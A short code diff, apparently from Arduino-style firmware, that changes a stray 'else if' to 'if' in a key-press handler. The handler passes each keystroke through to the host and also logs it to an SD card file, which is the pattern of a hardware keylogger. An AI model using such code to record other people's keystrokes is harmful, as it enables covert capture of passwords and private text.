@@ -85,7 +85,7 @@ void OnPress(int key) {
 
     int numSpecialKeys = sizeof(specialKeys) / sizeof(specialKeys[0]);
 
-    else if (!isSpecialKey(key, specialKeys, numSpecialKeys)) {
+    if (!isSpecialKey(key, specialKeys, numSpecialKeys)) {
         Keyboard.print((char)key);
         dataLog.print((char)key);
         printDebugOutput(dataLog.size(), SD.usedSize(), SD.totalSize());
